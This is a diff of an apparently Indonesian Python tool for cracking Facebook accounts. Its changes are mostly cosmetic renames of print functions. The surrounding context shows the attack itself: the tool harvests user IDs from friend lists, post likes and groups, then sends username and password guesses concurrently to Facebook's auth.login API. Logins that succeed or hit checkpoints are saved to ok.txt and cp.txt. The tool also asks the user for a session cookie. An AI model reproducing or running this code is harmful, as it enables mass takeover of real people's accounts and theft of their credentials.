@@ -120,19 +120,19 @@ def peak():
 
 def mbfv2():
     time.sleep(0.1)
-    aink(" \x1b[90m║═╔═══════════════════════════════════════════════╗")
-    aink(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m01.\033[97mmasuk                               \033[91m~═\033[90m║")
-    aink(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
-    aink(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m02.\033[97mcara mendapatkan cokie              \033[91m~═\033[90m║")
-    aink(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
-    aink(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m03.\033[97mmasuk grup fb《COMUNITY》OF THE HACKER\033[90m║")
-    aink(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
-    aink(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m04.\033[97mmasuk grup whatsapp                 \033[91m~═\033[90m║")
-    aink(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
-    aink(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m05.\033[97mupgrade tools                       \033[91m~═\033[90m║")
-    aink(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
-    aink(" \033[90m║═╚═>[\033[91m!\033[90m] \033[97m00\033[97m.\033[91mleave                               \033[91m~═\033[90m║")
-    aink(" \x1b[90m╚═════════════════════════════════════════════════╝")
+    mil(" \x1b[90m║═╔═══════════════════════════════════════════════╗")
+    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m01.\033[97mmasuk                               \033[91m~═\033[90m║")
+    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
+    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m02.\033[97mcara mendapatkan cokie              \033[91m~═\033[90m║")
+    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
+    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m03.\033[97mmasuk grup fb《COMUNITY》OF THE HACKER\033[90m║")
+    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
+    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m04.\033[97mmasuk grup whatsapp                 \033[91m~═\033[90m║")
+    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
+    mil(" \033[90m║═╚═>[\033[91m?\033[90m] \033[97m05.\033[97mupgrade tools                       \033[91m~═\033[90m║")
+    mil(" \033[90m║═╔═════════════════════════════════════════════~═\033[90m║")
+    mil(" \033[90m║═╚═>[\033[91m!\033[90m] \033[97m00\033[97m.\033[91mleave                               \033[91m~═\033[90m║")
+    mil(" \x1b[90m╚═════════════════════════════════════════════════╝")
     time.sleep(0.1)
 
     aink(" \033[97mMBASIC MULTI PRENFLIX ")
@@ -159,7 +159,7 @@ def mbfv2():
                    fail()
                    peak()
                    cek = input("\033[0;90m ║═════════════════════════════════╗ \n \033[96m║\033[90m[\033[93mTekan \033[92mopen \033[93muntuk membuka Cokie\033[0;90m]\033[90m ║ \n \033[90m╚═════════════════════════════════╝ \n \033[90m╔═════════════════════════════════╗\n \033[90m║[\033[91m>_<\033[90m] \033[92mCokiee \033[1;91m~>\033[90m                  \033[90m║\n \033[90m╚═════════════════════════════════╝ \033[1;93m")
-                   print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
+                   aink('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
@@ -201,8 +201,8 @@ def mbfv2():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;97m  * => {username}|{password}                       ",end="")
-                 print()
+                 mil(f"\r\033[1;97m  * => {username}|{password}                       ",end="")
+                 mil()
                  result += 1
                  if cek:
                         life.append(username+"|"+password)
@@ -210,8 +210,8 @@ def mbfv2():
                         with open('now.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;90m  * => {username}|{password}                    ",end="")
-                   print()
+                   mil(f"\r\033[1;90m  * => {username}|{password}                    ",end="")
+                   mil()
                    check += 1
                    if cek:
                            chek.append(username+"|"+password)
@@ -233,7 +233,7 @@ def mbfv2():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m [\033[1;94m+\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;93m ID retrieval process... ",end="")
+                 aink('\r\033[1;97m [\033[1;94m+\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;93m ID retrieval process... ",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -253,7 +253,7 @@ def mbfv2():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
+                 mil(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
@@ -277,7 +277,7 @@ def mbfv2():
                          id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[1;97m [\033[1;92m+\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses mengambil ID... ",end="")
+                 mil(f"\r\033[1;97m [\033[1;92m+\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses mengambil ID... ",end="")
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
@@ -311,14 +311,14 @@ def mbfv2():
                    aink ("\033[97m~")
                    doge=input("\033[97m╰╼▪>   \033[97m")
                    if doge =="":
-                         print("\n\n\033[00m [\033[91m!\033[00m] Harus dipilih!")
+                         aink("\n\n\033[00m [\033[91m!\033[00m] Harus dipilih!")
                          uwutc()
                    elif doge == '0' or doge =='00':
-                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu subscribe chanel youtube saya...\n\n")
+                         aink("\n\033[1;92m Terima kasih sudah menggunakan tools.\n  Dan kamu harus bantu subscribe chanel youtube saya...\n\n")
                          os.system('xdgu-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ')
                          exit()                   	
                    elif doge == '7' or doge =='07':
-                         print("\n\x1b[1;97m [\x1b[1;96m*\x1b[1;97m] \x1b[1;96mHarap bersabar... ")
+                         mil("\n\x1b[1;97m [\x1b[1;96m*\x1b[1;97m] \x1b[1;96mHarap bersabar... ")
                          aink("\x1b[1;91m ▪ 10")
                          aink("\x1b[1;91m ▪▪ 20")
                          aink("\x1b[1;91m ▪▪▪ 30")
@@ -385,14 +385,14 @@ def mbfv2():
                                          with open('cp.txt','a') as f:
                                                  f.write(x+"\n")
 
-                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Selesai...")
-                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
+                                 aink("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Selesai/done...")
+                                 aink("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di/save for \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                          except FileNotFoundError:
                                  exit("\n\033[00m[\033[91m!\033[00m] Kamu tidak mendapatkan hasil")
                    else:
                          mil("\n\n \033[00m[\033[91m😣\033[00m] Must choose!")
                          uwutc()
-                   print()
+                   mil()
                    lupo_lupo_milzu()
                    fail()
                    peak()
@@ -423,10 +423,10 @@ def mbfv2():
                                                   ex.submit(login,(users[1]),(passw))
                    if check != 0 or result != 0:
                            time.sleep(0.1)
-                           print("\n\n\x1b[1;92m  *\033[92m Selesai...")
+                           aink("\n\n\x1b[1;92m  *\033[92m Selesai...")
      
                    else:
-                           print("\n\n\x1b[1;91m  *\033[93m No result:(")
+                           mil("\n\n\x1b[1;91m  *\033[93m No result:(")
                except (KeyboardInterrupt,EOFError):
                        exit()
                except requests.exceptions.ConnectionError:
